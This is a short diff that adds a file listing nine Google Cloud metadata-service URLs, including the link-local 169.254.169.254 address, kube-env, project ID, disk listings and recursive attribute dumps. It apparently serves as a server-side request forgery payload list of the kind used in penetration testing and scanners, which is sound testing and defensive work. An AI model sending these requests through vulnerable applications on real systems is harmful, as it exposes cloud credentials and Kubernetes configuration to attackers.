@@ -1,0 +1,10 @@
+http://169.254.169.254/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://metadata.google.internal/computeMetadata/v1/instance/id
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
+http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
+http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json
+
